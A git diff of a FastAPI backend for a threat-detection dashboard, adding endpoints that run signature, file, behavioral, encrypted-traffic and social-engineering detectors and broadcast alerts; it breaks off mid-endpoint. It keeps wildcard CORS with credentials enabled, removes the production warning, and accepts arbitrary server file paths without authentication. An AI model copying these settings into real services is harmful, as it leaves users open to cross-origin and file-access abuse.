@@ -1,3 +1,8 @@
+"""
+Enhanced NeuralShield Backend
+Integrates all advanced threat detection modules
+"""
+
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Depends, HTTPException, status, BackgroundTasks, Query, Request
 from fastapi.middleware.cors import CORSMiddleware
 from typing import List, Dict, Any, Optional
@@ -11,26 +16,92 @@ import os
 from collections import deque
 from pydantic import BaseModel
 
-# Setup logging
+# Setup logging first
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
 )
 logger = logging.getLogger(__name__)
 
-# Create FastAPI app
-app = FastAPI(title="Real-Time Cybersecurity Monitoring API")
+# Import enhanced detection modules
+import sys
+sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
 
-# Add CORS middleware to allow frontend to connect
+# Import the trained Windows10 threat detector
+try:
+    from models.windows10_threat_detector import Windows10ThreatDetector
+    from ml_model import ThreatDetectionModel
+    TRAINED_MODELS_AVAILABLE = True
+    logger.info("Trained models loaded successfully")
+except ImportError as e:
+    logger.warning(f"Trained models not available: {e}")
+    TRAINED_MODELS_AVAILABLE = False
+
+try:
+    # Try to import full enhanced modules first
+    from enhanced_models.ensemble_detector import EnhancedThreatDetector
+    from enhanced_models.signature_detector import SignatureDetector
+    from enhanced_models.file_analyzer import FileAnalyzer
+    from enhanced_models.behavioral_analyzer import BehavioralAnalyzer
+    from enhanced_models.encrypted_detector import EncryptedThreatDetector
+    from enhanced_models.social_engineering_detector import SocialEngineeringDetector
+    ENHANCED_MODULES_AVAILABLE = True
+    logger.info("Full enhanced modules loaded successfully")
+except ImportError as e:
+    logger.warning(f"Full enhanced modules not available: {e}")
+    try:
+        # Fallback to simplified modules
+        from enhanced_models.ensemble_detector_simple import EnhancedThreatDetector
+        from enhanced_models.signature_detector_simple import SignatureDetector
+        from enhanced_models.file_analyzer_simple import FileAnalyzer
+        from enhanced_models.behavioral_analyzer_simple import BehavioralAnalyzer
+        from enhanced_models.encrypted_detector_simple import EncryptedThreatDetector
+        from enhanced_models.social_engineering_detector_simple import SocialEngineeringDetector
+        ENHANCED_MODULES_AVAILABLE = True
+        logger.info("Simplified enhanced modules loaded successfully")
+    except ImportError as e2:
+        logger.warning(f"Simplified enhanced modules not available: {e2}")
+        ENHANCED_MODULES_AVAILABLE = False
+
+# Create FastAPI app
+app = FastAPI(title="Enhanced NeuralShield - Advanced Threat Detection API")
+
+# Add CORS middleware
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=["*"],  # In production, replace with specific origins
+    allow_origins=["*"],
     allow_credentials=True,
     allow_methods=["*"],
     allow_headers=["*"],
 )
 
-# WebSocket connection manager with improved handling
+# Initialize trained models
+if TRAINED_MODELS_AVAILABLE:
+    try:
+        windows10_detector = Windows10ThreatDetector()
+        ml_model = ThreatDetectionModel()
+        logger.info("Trained models initialized successfully")
+    except Exception as e:
+        logger.error(f"Failed to initialize trained models: {e}")
+        windows10_detector = None
+        ml_model = None
+else:
+    windows10_detector = None
+    ml_model = None
+
+# Initialize enhanced threat detector
+if ENHANCED_MODULES_AVAILABLE:
+    enhanced_detector = EnhancedThreatDetector({
+        'signature': {
+            'virustotal_api_key': os.getenv('VIRUSTOTAL_API_KEY', ''),
+            'yara_rules_path': 'yara_rules/',
+            'clamav_path': 'clamscan'
+        }
+    })
+else:
+    enhanced_detector = None
+
+# WebSocket connection manager
 class ConnectionManager:
     def __init__(self):
         self.active_connections: Dict[str, WebSocket] = {}
@@ -43,15 +114,12 @@ class ConnectionManager:
         }
 
     async def connect(self, websocket: WebSocket, client_id: str = None):
-        """Connect a client with better tracking and error handling"""
         try:
             await websocket.accept()
             
-            # Generate client ID if not provided
             if client_id is None:
                 client_id = str(uuid.uuid4())
                 
-            # Store connection with its ID
             self.active_connections[client_id] = websocket
             self.connection_timestamps[client_id] = datetime.now()
             self.stats["total_connections"] += 1
@@ -65,21 +133,18 @@ class ConnectionManager:
             return None
 
     def disconnect(self, client_id: str):
-        """Disconnect a client by ID with cleanup"""
         if client_id in self.active_connections:
             self.active_connections.pop(client_id, None)
             self.connection_timestamps.pop(client_id, None)
             self.stats["total_disconnections"] += 1
             
-            # Log connection duration if available
             if client_id in self.connection_timestamps:
                 duration = datetime.now() - self.connection_timestamps[client_id]
-                logger.info(f"Client disconnected: {client_id} - Connection duration: {duration} - Now {len(self.active_connections)} active connections")
+                logger.info(f"Client disconnected: {client_id} - Connection duration: {duration}")
             else:
-                logger.info(f"Client disconnected: {client_id} - Now {len(self.active_connections)} active connections")
+                logger.info(f"Client disconnected: {client_id}")
 
     async def broadcast(self, message: str):
-        """Broadcast a message to all connected clients with better error handling"""
         disconnected_clients = []
         self.stats["messages_sent"] += 1
         
@@ -91,185 +156,45 @@ class ConnectionManager:
                 self.stats["errors"] += 1
                 disconnected_clients.append(client_id)
         
-        # Clean up disconnected clients
         for client_id in disconnected_clients:
             self.disconnect(client_id)
             
-        if disconnected_clients:
-            logger.info(f"Removed {len(disconnected_clients)} disconnected clients during broadcast")
-            
         return len(self.active_connections) - len(disconnected_clients)
-
-    async def send_to_client(self, client_id: str, message: str):
-        """Send message to a specific client"""
-        if client_id in self.active_connections:
-            try:
-                await self.active_connections[client_id].send_text(message)
-                return True
-            except Exception as e:
-                logger.error(f"Error sending to client {client_id}: {e}")
-                self.disconnect(client_id)
-                self.stats["errors"] += 1
-                return False
-        return False
-
-    def get_connection_info(self):
-        """Get information about current connections"""
-        connection_info = []
-        for client_id, _ in self.active_connections.items():
-            connected_at = self.connection_timestamps.get(client_id, "unknown")
-            if isinstance(connected_at, datetime):
-                duration = datetime.now() - connected_at
-                duration_str = str(duration).split('.')[0]  # Remove microseconds
-            else:
-                duration_str = "unknown"
-                
-            connection_info.append({
-                "client_id": client_id,
-                "connected_at": str(connected_at),
-                "connection_duration": duration_str
-            })
-            
-        return {
-            "active_connections": len(self.active_connections),
-            "connections": connection_info,
-            "stats": self.stats
-        }
 
 manager = ConnectionManager()
 
-# Network clients use a more efficient structure
-class NetworkConnectionManager:
-    def __init__(self):
-        self.active_connections: Dict[str, WebSocket] = {}
-        self.connection_timestamps: Dict[str, datetime] = {}
-        self.stats = {
-            "total_connections": 0,
-            "total_disconnections": 0,
-            "messages_sent": 0,
-            "errors": 0
-        }
-
-    async def connect(self, websocket: WebSocket):
-        """Connect a network monitoring client"""
-        try:
-            await websocket.accept()
-            client_id = str(uuid.uuid4())
-            self.active_connections[client_id] = websocket
-            self.connection_timestamps[client_id] = datetime.now()
-            self.stats["total_connections"] += 1
-            
-            logger.info(f"Network client connected: {client_id} - Now {len(self.active_connections)} active network connections")
-            return client_id
-            
-        except Exception as e:
-            logger.error(f"Error accepting network WebSocket connection: {e}")
-            self.stats["errors"] += 1
-            return None
-
-    def disconnect(self, client_id: str):
-        """Disconnect a network client"""
-        if client_id in self.active_connections:
-            self.active_connections.pop(client_id, None)
-            
-            # Log connection duration if available
-            if client_id in self.connection_timestamps:
-                duration = datetime.now() - self.connection_timestamps.get(client_id)
-                self.connection_timestamps.pop(client_id, None)
-                self.stats["total_disconnections"] += 1
-                logger.info(f"Network client disconnected: {client_id} - Connection duration: {duration} - Now {len(self.active_connections)} active network connections")
-            else:
-                logger.info(f"Network client disconnected: {client_id} - Now {len(self.active_connections)} active network connections")
-
-    async def broadcast(self, message: str):
-        """Broadcast network data to all connected clients"""
-        disconnected_clients = []
-        self.stats["messages_sent"] += 1
-        
-        for client_id, connection in self.active_connections.items():
-            try:
-                await connection.send_text(message)
-            except Exception as e:
-                logger.error(f"Error sending to network client {client_id}: {e}")
-                self.stats["errors"] += 1
-                disconnected_clients.append(client_id)
-        
-        # Clean up disconnected clients
-        for client_id in disconnected_clients:
-            self.disconnect(client_id)
-            
-        if disconnected_clients:
-            logger.info(f"Removed {len(disconnected_clients)} disconnected network clients during broadcast")
-            
-        return len(self.active_connections) - len(disconnected_clients)
-
-    def get_connection_info(self):
-        """Get information about current network connections"""
-        connection_info = []
-        for client_id in self.active_connections:
-            connected_at = self.connection_timestamps.get(client_id, "unknown")
-            if isinstance(connected_at, datetime):
-                duration = datetime.now() - connected_at
-                duration_str = str(duration).split('.')[0]  # Remove microseconds
-            else:
-                duration_str = "unknown"
-                
-            connection_info.append({
-                "client_id": client_id,
-                "connected_at": str(connected_at),
-                "connection_duration": duration_str
-            })
-            
-        return {
-            "active_connections": len(self.active_connections),
-            "connections": connection_info,
-            "stats": self.stats
-        }
-
-# Initialize network connection manager
-network_manager = NetworkConnectionManager()
-
 # Data models
-class AlertUpdate(BaseModel):
-    status: str
+class ThreatDetectionRequest(BaseModel):
+    file_path: Optional[str] = None
+    system_data: Optional[Dict[str, Any]] = None
+    network_data: Optional[Dict[str, Any]] = None
+    communication_data: Optional[Dict[str, Any]] = None
 
-class NetworkData(BaseModel):
-    inbound_traffic: Dict[str, Any]
-    outbound_traffic: Dict[str, Any]
-    packet_rate: Optional[Dict[str, Any]] = None
-    active_connections: Optional[Dict[str, Any]] = None
-    # System metrics
-    cpu_usage: Optional[float] = None
-    memory_usage: Optional[float] = None
-    memory_used: Optional[float] = None
-    memory_total: Optional[float] = None
-    process_count: Optional[int] = None
-    top_processes: Optional[List[Dict[str, Any]]] = None
+class SignatureDetectionRequest(BaseModel):
+    file_path: str
 
-# In-memory storage for real data
+class FileAnalysisRequest(BaseModel):
+    file_path: str
+
+class BehavioralAnalysisRequest(BaseModel):
+    system_data: Dict[str, Any]
+
+class EncryptedThreatRequest(BaseModel):
+    network_data: Dict[str, Any]
+
+class SocialEngineeringRequest(BaseModel):
+    communication_data: Dict[str, Any]
+
+# In-memory storage
 alerts = []
-alert_history = deque(maxlen=1000)  # Store last 1000 alerts
-
-# Network monitoring data storage
-network_data = {
-    "inbound_traffic": deque(maxlen=100),  # Last 100 data points
-    "outbound_traffic": deque(maxlen=100),
-    "packet_rate": deque(maxlen=100),
-    "active_connections": deque(maxlen=100),
-    "warnings": deque(maxlen=50)  # Last 50 warning events
-}
-
-# Status options for alerts
-STATUS_OPTIONS = ["open", "investigating", "resolved"]
+alert_history = deque(maxlen=1000)
+threat_detection_history = deque(maxlen=1000)
 
 # Helper functions
 async def broadcast_alert(alert):
-    """Broadcast an alert to all connected websocket clients"""
     try:
-        # Log the alert being broadcasted
-        logger.info(f"Broadcasting alert to {len(manager.active_connections)} clients: {alert['threat_type']} (ID: {alert['id']})")
+        logger.info(f"Broadcasting alert to {len(manager.active_connections)} clients: {alert['threat_type']}")
         
-        # Ensure the alert has all required fields for frontend
         formatted_alert = {
             "id": alert["id"],
             "threat_type": alert["threat_type"],
@@ -278,176 +203,339 @@ async def broadcast_alert(alert):
             "status": alert.get("status", "open"),
             "device_id": alert.get("device_id", "unknown"),
             "description": alert.get("description", "No description provided"),
+            "detection_method": alert.get("detection_method", "unknown"),
+            "confidence": alert.get("confidence", 0.0)
         }
         
-        # Add metrics if present
         if "metrics" in alert:
             formatted_alert["metrics"] = alert["metrics"]
-        elif "confidence" in alert:
-            # Handle legacy format
-            formatted_alert["metrics"] = {
-                "confidence": alert["confidence"]
-            }
         
-        # Create the message with proper type field
         message = {
             "type": "alert", 
             "data": formatted_alert
         }
         
-        # Convert to JSON and broadcast
         json_message = json.dumps(message)
-        logger.info(f"Sending WebSocket message: {json_message[:200]}...")
         active_clients = await manager.broadcast(json_message)
         
-        # Log success
         logger.info(f"Successfully broadcasted alert {alert['id']} to {active_clients} clients")
         return True
     except Exception as e:
         logger.error(f"Error broadcasting alert: {e}")
         return False
 
-async def broadcast_network_data(data):
-    """Broadcast network data to connected websocket clients"""
-    try:
-        message = json.dumps({"type": "update", "data": data})
-        active_clients = await network_manager.broadcast(message)
-        logger.debug(f"Network data broadcast to {active_clients} clients")
-        return active_clients
-    except Exception as e:
-        logger.error(f"Error broadcasting network data: {e}")
-        return 0
-
-# API for receiving data from windows10_monitor.py
-@app.post("/api/network-data")
-async def receive_network_data(data: NetworkData):
-    """Receive real network data from the Windows monitoring agent"""
-    try:
-        # Store received data
-        if data.inbound_traffic:
-            network_data["inbound_traffic"].append(data.inbound_traffic)
-        
-        if data.outbound_traffic:
-            network_data["outbound_traffic"].append(data.outbound_traffic)
-        
-        if data.packet_rate:
-            network_data["packet_rate"].append(data.packet_rate)
-        
-        if data.active_connections:
-            network_data["active_connections"].append(data.active_connections)
-        
-        # Prepare update message
-        update_data = {
-            "inbound_traffic": data.inbound_traffic,
-            "outbound_traffic": data.outbound_traffic,
-            "packet_rate": data.packet_rate,
-            "active_connections": data.active_connections
-        }
-        
-        # Broadcast to connected clients
-        await broadcast_network_data(update_data)
-        
-        logger.info("Received and broadcast real network data from agent")
-        return {"status": "success"}
-    
-    except Exception as e:
-        logger.error(f"Error processing network data: {e}")
-        raise HTTPException(status_code=500, detail=str(e))
-
-@app.post("/api/alert")
-async def receive_alert(alert: Dict[str, Any]):
-    """Receive real alerts from the Windows monitoring agent"""
-    try:
-        logger.info(f"Received alert request: {json.dumps(alert)}")
-        
-        # Ensure alert has required fields
-        if not all(key in alert for key in ["id", "threat_type", "severity", "timestamp"]):
-            logger.error(f"Invalid alert format missing required fields: {json.dumps(alert)}")
-            raise HTTPException(status_code=400, detail="Invalid alert format")
-        
-        # Add to alerts and history
-        alerts.insert(0, alert)  # Add to beginning (newest first)
-        alert_history.append(alert)
-        
-        logger.info(f"Alert added to memory: {alert['threat_type']} ({alert['severity']})")
-        
-        # Broadcast to clients
-        await broadcast_alert(alert)
-        
-        logger.info(f"Finished processing alert: {alert['threat_type']}")
-        return {"status": "success"}
-    
-    except Exception as e:
-        logger.error(f"Error processing alert: {e}")
-        raise HTTPException(status_code=500, detail=str(e))
-
-@app.get("/debug/alerts")
-async def debug_alerts():
-    """Debug endpoint to check all alerts in memory"""
-    return {
-        "active_websocket_connections": len(manager.active_connections),
-        "total_alerts_in_memory": len(alerts),
-        "most_recent_alert": alerts[0] if alerts else None,
-        "alert_history_size": len(alert_history)
-    }
-
-# Debug endpoint for WebSocket connections
-@app.get("/debug/connections")
-async def debug_connections():
-    """Debug endpoint to check WebSocket connections"""
-    return {
-        "alert_websockets": manager.get_connection_info(),
-        "network_websockets": network_manager.get_connection_info()
-    }
-
-# Start the background tasks when app starts
-@app.on_event("startup")
-async def startup_event():
-    logger.info("Backend started - ONLY processing REAL data from monitoring agent")
-
 # API Endpoints
 @app.get("/")
 async def root():
-    return {"message": "Real-Time Cybersecurity Monitoring API"}
+    return {"message": "Enhanced NeuralShield - Advanced Threat Detection API", "version": "2.0.0"}
 
-@app.get("/test-alert")
-async def test_alert():
-    """Create a test alert to check frontend connectivity"""
+@app.get("/health")
+async def health_check():
+    return {"status": "healthy", "timestamp": datetime.now().isoformat()}
+
+@app.post("/api/enhanced/detect")
+async def enhanced_threat_detection(request: ThreatDetectionRequest):
+    """Comprehensive threat detection using all modules"""
     try:
-        test_alert = {
-            "id": str(uuid.uuid4()),
-            "threat_type": "Test Alert",
-            "severity": "medium",
-            "timestamp": datetime.now().isoformat(),
-            "status": "open",
-            "device_id": "test-device",
-            "description": "This is a test alert to verify WebSocket connectivity",
-            "metrics": {
-                "confidence": 0.85,
-                "top_features": ["test1", "test2", "test3"]
+        if not ENHANCED_MODULES_AVAILABLE or not enhanced_detector:
+            raise HTTPException(status_code=503, detail="Enhanced modules not available")
+        
+        logger.info("Starting enhanced threat detection")
+        
+        # Prepare data for detection
+        data = {}
+        if request.file_path:
+            data['file_path'] = request.file_path
+        if request.system_data:
+            data['system_data'] = request.system_data
+        if request.network_data:
+            data['network_data'] = request.network_data
+        if request.communication_data:
+            data['communication_data'] = request.communication_data
+        
+        # Run comprehensive detection
+        detection_result = enhanced_detector.detect_threats(data)
+        
+        # Store in history
+        threat_detection_history.append(detection_result)
+        
+        # Create alert if threats detected
+        if detection_result.get("threats_detected"):
+            alert_data = {
+                "id": str(uuid.uuid4()),
+                "threat_type": "Enhanced Threat Detection",
+                "severity": detection_result.get("threat_level", "medium").lower(),
+                "timestamp": datetime.now().isoformat(),
+                "status": "open",
+                "device_id": "enhanced-detector",
+                "description": f"Enhanced threat detection found {len(detection_result['threats_detected'])} threats",
+                "detection_method": "ensemble",
+                "confidence": detection_result.get("confidence", 0.0),
+                "metrics": {
+                    "threat_count": len(detection_result["threats_detected"]),
+                    "threat_types": detection_result.get("threat_types", []),
+                    "overall_risk_score": detection_result.get("overall_risk_score", 0.0)
+                }
             }
+            
+            alerts.insert(0, alert_data)
+            alert_history.append(alert_data)
+            
+            # Broadcast alert
+            await broadcast_alert(alert_data)
+        
+        return {
+            "status": "success",
+            "detection_result": detection_result,
+            "threats_detected": len(detection_result.get("threats_detected", [])),
+            "threat_level": detection_result.get("threat_level", "None")
         }
         
-        # Add to alerts list
-        alerts.insert(0, test_alert)
-        alert_history.append(test_alert)
-        
-        # Broadcast to all connected clients
-        await broadcast_alert(test_alert)
-        
-        logger.info("Test alert created and broadcasted")
-        return {"status": "success", "message": "Test alert created", "alert": test_alert}
     except Exception as e:
-        logger.error(f"Error creating test alert: {e}")
+        logger.error(f"Error in enhanced threat detection: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
-@app.get("/alerts")
+@app.post("/api/enhanced/advanced-detect")
+async def advanced_threat_detection(request: ThreatDetectionRequest):
+    """Advanced threat detection for sophisticated attacks"""
+    try:
+        if not ENHANCED_MODULES_AVAILABLE or not enhanced_detector:
+            raise HTTPException(status_code=503, detail="Enhanced modules not available")
+        
+        logger.info("Starting advanced threat detection")
+        
+        data = {}
+        if request.system_data:
+            data['system_data'] = request.system_data
+        if request.network_data:
+            data['network_data'] = request.network_data
+        if request.communication_data:
+            data['communication_data'] = request.communication_data
+        
+        # Run advanced detection
+        advanced_result = enhanced_detector.detect_advanced_threats(data)
+        
+        # Create alerts for advanced threats
+        if advanced_result.get("advanced_threats"):
+            for threat in advanced_result["advanced_threats"]:
+                alert_data = {
+                    "id": str(uuid.uuid4()),
+                    "threat_type": threat["type"],
+                    "severity": "high",
+                    "timestamp": datetime.now().isoformat(),
+                    "status": "open",
+                    "device_id": "advanced-detector",
+                    "description": f"Advanced threat detected: {threat['type']}",
+                    "detection_method": "advanced",
+                    "confidence": threat.get("confidence", 0.0),
+                    "metrics": threat.get("indicators", {})
+                }
+                
+                alerts.insert(0, alert_data)
+                alert_history.append(alert_data)
+                
+                # Broadcast alert
+                await broadcast_alert(alert_data)
+        
+        return {
+            "status": "success",
+            "advanced_result": advanced_result,
+            "advanced_threats_detected": len(advanced_result.get("advanced_threats", []))
+        }
+        
+    except Exception as e:
+        logger.error(f"Error in advanced threat detection: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.post("/api/signature/detect")
+async def signature_detection(request: SignatureDetectionRequest):
+    """Signature-based threat detection"""
+    try:
+        if not ENHANCED_MODULES_AVAILABLE or not enhanced_detector:
+            raise HTTPException(status_code=503, detail="Enhanced modules not available")
+        
+        result = enhanced_detector.signature_detector.detect_threats(request.file_path)
+        
+        if result.get("detected"):
+            alert_data = {
+                "id": str(uuid.uuid4()),
+                "threat_type": result.get("threat_type", "Signature Match"),
+                "severity": "high" if result.get("confidence", 0) > 0.8 else "medium",
+                "timestamp": datetime.now().isoformat(),
+                "status": "open",
+                "device_id": "signature-detector",
+                "description": f"Signature-based threat detected: {result.get('threat_type')}",
+                "detection_method": "signature",
+                "confidence": result.get("confidence", 0.0),
+                "metrics": result.get("details", {})
+            }
+            
+            alerts.insert(0, alert_data)
+            alert_history.append(alert_data)
+            
+            await broadcast_alert(alert_data)
+        
+        return {"status": "success", "result": result}
+        
+    except Exception as e:
+        logger.error(f"Error in signature detection: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.post("/api/file/analyze")
+async def file_analysis(request: FileAnalysisRequest):
+    """File-based malware analysis"""
+    try:
+        if not ENHANCED_MODULES_AVAILABLE or not enhanced_detector:
+            raise HTTPException(status_code=503, detail="Enhanced modules not available")
+        
+        result = enhanced_detector.file_analyzer.predict(request.file_path)
+        
+        if result.get("prediction") == "malicious":
+            alert_data = {
+                "id": str(uuid.uuid4()),
+                "threat_type": result.get("threat_type", "File-based Malware"),
+                "severity": "high" if result.get("confidence", 0) > 0.8 else "medium",
+                "timestamp": datetime.now().isoformat(),
+                "status": "open",
+                "device_id": "file-analyzer",
+                "description": f"File-based malware detected: {result.get('threat_type')}",
+                "detection_method": "file_analysis",
+                "confidence": result.get("confidence", 0.0),
+                "metrics": result.get("features", {})
+            }
+            
+            alerts.insert(0, alert_data)
+            alert_history.append(alert_data)
+            
+            await broadcast_alert(alert_data)
+        
+        return {"status": "success", "result": result}
+        
+    except Exception as e:
+        logger.error(f"Error in file analysis: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.post("/api/behavioral/analyze")
+async def behavioral_analysis(request: BehavioralAnalysisRequest):
+    """Behavioral analysis for zero-day and fileless threats"""
+    try:
+        if not ENHANCED_MODULES_AVAILABLE or not enhanced_detector:
+            raise HTTPException(status_code=503, detail="Enhanced modules not available")
+        
+        data = enhanced_detector.behavioral_analyzer.collect_behavioral_data()
+        result = enhanced_detector.behavioral_analyzer.analyze_behavior(data)
+        
+        if result.get("threats_detected"):
+            alert_data = {
+                "id": str(uuid.uuid4()),
+                "threat_type": "Behavioral Anomaly",
+                "severity": result.get("threat_level", "medium").lower(),
+                "timestamp": datetime.now().isoformat(),
+                "status": "open",
+                "device_id": "behavioral-analyzer",
+                "description": f"Behavioral anomaly detected: {result.get('threat_level')} risk",
+                "detection_method": "behavioral",
+                "confidence": result.get("overall_risk_score", 0.0) / 10.0,
+                "metrics": {
+                    "threat_count": len(result.get("threats_detected", [])),
+                    "threat_types": result.get("threat_types", [])
+                }
+            }
+            
+            alerts.insert(0, alert_data)
+            alert_history.append(alert_data)
+            
+            await broadcast_alert(alert_data)
+        
+        return {"status": "success", "result": result}
+        
+    except Exception as e:
+        logger.error(f"Error in behavioral analysis: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.post("/api/encrypted/detect")
+async def encrypted_threat_detection(request: EncryptedThreatRequest):
+    """Encrypted threat detection"""
+    try:
+        if not ENHANCED_MODULES_AVAILABLE or not enhanced_detector:
+            raise HTTPException(status_code=503, detail="Enhanced modules not available")
+        
+        result = enhanced_detector.encrypted_detector.detect_encrypted_threats(request.network_data)
+        
+        if result.get("threats_detected"):
+            alert_data = {
+                "id": str(uuid.uuid4()),
+                "threat_type": "Encrypted Threat",
+                "severity": result.get("threat_level", "medium").lower(),
+                "timestamp": datetime.now().isoformat(),
+                "status": "open",
+                "device_id": "encrypted-detector",
+                "description": f"Encrypted threat detected: {result.get('threat_level')} risk",
+                "detection_method": "encrypted",
+                "confidence": result.get("overall_risk_score", 0.0) / 10.0,
+                "metrics": {
+                    "threat_count": len(result.get("threats_detected", [])),
+                    "threat_types": result.get("threat_types", [])
+                }
+            }
+            
+            alerts.insert(0, alert_data)
+            alert_history.append(alert_data)
+            
+            await broadcast_alert(alert_data)
+        
+        return {"status": "success", "result": result}
+        
+    except Exception as e:
+        logger.error(f"Error in encrypted threat detection: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.post("/api/social-engineering/detect")
+async def social_engineering_detection(request: SocialEngineeringRequest):
+    """Social engineering detection"""
+    try:
+        if not ENHANCED_MODULES_AVAILABLE or not enhanced_detector:
+            raise HTTPException(status_code=503, detail="Enhanced modules not available")
+        
+        result = enhanced_detector.social_engineering_detector.detect_social_engineering(request.communication_data)
+        
+        if result.get("threats_detected"):
+            alert_data = {
+                "id": str(uuid.uuid4()),
+                "threat_type": "Social Engineering",
+                "severity": result.get("threat_level", "medium").lower(),
+                "timestamp": datetime.now().isoformat(),
+                "status": "open",
+                "device_id": "social-engineering-detector",
+                "description": f"Social engineering detected: {result.get('threat_level')} risk",
+                "detection_method": "social_engineering",
+                "confidence": result.get("overall_risk_score", 0.0) / 10.0,
+                "metrics": {
+                    "threat_count": len(result.get("threats_detected", [])),
+                    "threat_types": result.get("threat_types", [])
+                }
+            }
+            
+            alerts.insert(0, alert_data)
+            alert_history.append(alert_data)
+            
+            await broadcast_alert(alert_data)
+        
+        return {"status": "success", "result": result}
+        
+    except Exception as e:
+        logger.error(f"Error in social engineering detection: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.get("/api/alerts")
 async def get_alerts(
     limit: int = Query(100, ge=1, le=1000),
     offset: int = Query(0, ge=0),
     severity: Optional[str] = None,
-    status: Optional[str] = None
+    status: Optional[str] = None,
+    detection_method: Optional[str] = None
 ):
+    """Get alerts with filtering options"""
     filtered_alerts = alerts
     
     if severity:
@@ -456,102 +544,250 @@ async def get_alerts(
     if status:
         filtered_alerts = [a for a in filtered_alerts if a["status"] == status]
     
-    # Apply pagination
+    if detection_method:
+        filtered_alerts = [a for a in filtered_alerts if a.get("detection_method") == detection_method]
+    
     return filtered_alerts[offset:offset + limit]
 
-@app.get("/alerts/{alert_id}")
-async def get_alert(alert_id: str):
-    for alert in alerts:
-        if alert["id"] == alert_id:
-            return alert
-    raise HTTPException(status_code=404, detail="Alert not found")
+@app.get("/alerts")
+async def get_alerts_legacy():
+    """Legacy alerts endpoint for backward compatibility"""
+    return alerts[:100]
 
-@app.put("/alerts/{alert_id}/status")
-async def update_alert_status(alert_id: str, update: AlertUpdate):
-    for alert in alerts:
-        if alert["id"] == alert_id:
-            if update.status not in STATUS_OPTIONS:
-                raise HTTPException(status_code=400, detail="Invalid status value")
-            
-            alert["status"] = update.status
-            
-            # Broadcast update to all connected clients
-            await broadcast_alert(alert)
-            
-            return {"message": "Status updated", "alert": alert}
+@app.post("/test-alert")
+async def create_test_alert():
+    """Create a test alert for development purposes"""
+    test_alert = {
+        "id": str(uuid.uuid4()),
+        "threat_type": "Test Threat",
+        "severity": "medium",
+        "timestamp": datetime.now().isoformat(),
+        "status": "open",
+        "device_id": "test-device",
+        "description": "This is a test alert created for development purposes",
+        "detection_method": "test",
+        "confidence": 0.85,
+        "metrics": {
+            "test_metric": "test_value"
+        }
+    }
     
-    raise HTTPException(status_code=404, detail="Alert not found")
+    alerts.insert(0, test_alert)
+    alert_history.append(test_alert)
+    
+    # Broadcast the test alert
+    await broadcast_alert(test_alert)
+    
+    return {"status": "success", "alert": test_alert}
 
-@app.get("/dashboard/summary")
+@app.get("/api/dashboard/summary")
 async def get_dashboard_summary():
+    """Get enhanced dashboard summary"""
     total_alerts = len(alerts)
     open_alerts = len([a for a in alerts if a["status"] == "open"])
     critical_alerts = len([a for a in alerts if a["severity"] == "critical" and a["status"] == "open"])
     
-    # Calculate a security score based on real alerts
+    # Count by detection method
+    detection_methods = {}
+    for alert in alerts:
+        method = alert.get("detection_method", "unknown")
+        detection_methods[method] = detection_methods.get(method, 0) + 1
+    
+    # Count by threat type
+    threat_types = {}
+    for alert in alerts:
+        threat_type = alert.get("threat_type", "unknown")
+        threat_types[threat_type] = threat_types.get(threat_type, 0) + 1
+    
+    # Calculate security score
     severity_weights = {"low": 1, "medium": 3, "high": 5, "critical": 10}
     severity_counts = {}
     
     for severity in ["low", "medium", "high", "critical"]:
         severity_counts[severity] = len([a for a in alerts if a.get("severity") == severity and a.get("status") == "open"])
     
-    # Lower is better for security score
     weighted_sum = sum(severity_counts[s] * severity_weights[s] for s in severity_counts.keys())
-    
-    # Convert to a 0-100 score where 100 is best
     security_score = max(0, 100 - min(weighted_sum * 2, 100))
-    
-    # Analyze alerts over time (last 24 hours)
-    current_time = datetime.now()
-    hours_ago_24 = current_time - timedelta(hours=24)
-    
-    alerts_by_hour = []
-    for i in range(24):
-        hour_start = hours_ago_24 + timedelta(hours=i)
-        hour_end = hours_ago_24 + timedelta(hours=i+1)
-        
-        count = len([
-            a for a in alert_history 
-            if "timestamp" in a and hour_start <= datetime.fromisoformat(a["timestamp"]) < hour_end
-        ])
-        
-        alerts_by_hour.append({
-            "hour": (current_time - timedelta(hours=24-i)).hour,
-            "count": count
-        })
     
     return {
         "total_alerts": total_alerts,
         "open_alerts": open_alerts,
         "critical_alerts": critical_alerts,
         "security_score": security_score,
-        "alerts_by_hour": alerts_by_hour
+        "detection_methods": detection_methods,
+        "threat_types": threat_types,
+        "enhanced_modules": {
+            "signature_detection": "active" if ENHANCED_MODULES_AVAILABLE else "inactive",
+            "file_analysis": "active" if ENHANCED_MODULES_AVAILABLE else "inactive",
+            "behavioral_analysis": "active" if ENHANCED_MODULES_AVAILABLE else "inactive",
+            "encrypted_detection": "active" if ENHANCED_MODULES_AVAILABLE else "inactive",
+            "social_engineering": "active" if ENHANCED_MODULES_AVAILABLE else "inactive"
+        }
     }
 
-# WebSocket endpoint for real-time updates
+@app.get("/api/detection/history")
+async def get_detection_history(limit: int = Query(50, ge=1, le=200)):
+    """Get threat detection history"""
+    return list(threat_detection_history)[-limit:]
+
+@app.get("/api/detection/stats")
+async def get_detection_stats():
+    """Get detection statistics"""
+    return {
+        "total_detections": len(threat_detection_history),
+        "active_connections": len(manager.active_connections),
+        "connection_stats": manager.stats,
+        "detection_weights": enhanced_detector.detection_weights if enhanced_detector else {}
+    }
+
+@app.post("/api/trained-models/windows10-detect")
+async def windows10_detect(request: Dict[str, Any]):
+    """Detect threats using the trained Windows10 model"""
+    if not TRAINED_MODELS_AVAILABLE or windows10_detector is None:
+        raise HTTPException(status_code=503, detail="Trained models not available")
+    
+    try:
+        # Extract metrics from request
+        metrics = request.get('metrics', {})
+        
+        # Run detection using trained model
+        result = windows10_detector.detect(metrics)
+        
+        # Create alert if threat detected
+        if result['is_threat']:
+            alert = {
+                "id": str(uuid.uuid4()),
+                "threat_type": "Windows10 System Threat",
+                "severity": "high" if result['confidence'] > 0.8 else "medium",
+                "timestamp": datetime.now().isoformat(),
+                "status": "open",
